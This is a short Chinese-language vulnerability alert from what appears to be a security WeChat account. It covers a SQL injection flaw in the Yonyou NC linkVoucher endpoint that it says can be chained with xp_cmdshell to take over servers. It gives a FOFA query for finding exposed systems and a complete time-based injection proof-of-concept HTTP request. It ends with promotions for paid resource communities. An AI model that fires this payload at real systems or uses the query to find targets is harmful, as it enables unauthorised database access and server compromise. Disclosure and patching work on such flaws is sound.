#  漏洞预警 | 用友NC linkVoucher SQL注入漏洞   
Enomothem  Eonian Sharp   2024-06-01 12:45  
  
## 产品介绍  
  
用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。  
## 漏洞威胁  
  
用友NC /portal/pt/yercommon/linkVoucher 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
## 影响范围：  
  
NC 65  
## 空间测绘  
  
FOFA: app="用友-UFIDA-NC"  
## 漏洞复现  
  
POC  
```
GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```  
  
### 免费加入知识星球获取更多资源  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hvMQKkLOqzMTficPkTrCDM8eDLmPJ2QcGV0zscBY58KKp4S31mB8SWw1I0CYoRa1Mah1CpbJJ3RYeA3oKcpHQ8g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 加入知识大陆获取内部工具情报等  
  
阿sir，你的poc到了，近期发现斗象的知识大陆充满圈子气息，生气活活，将与斗象联合推广知识大陆，将会把一些优质的资源发到知识大陆中，有料，更有量！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hvMQKkLOqzMTficPkTrCDM8eDLmPJ2QcGKLZ7K71um2f1GoZxvl4AwhWLY1zJFL7MmtpQibBGyiaFNMaM3BvGG65Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
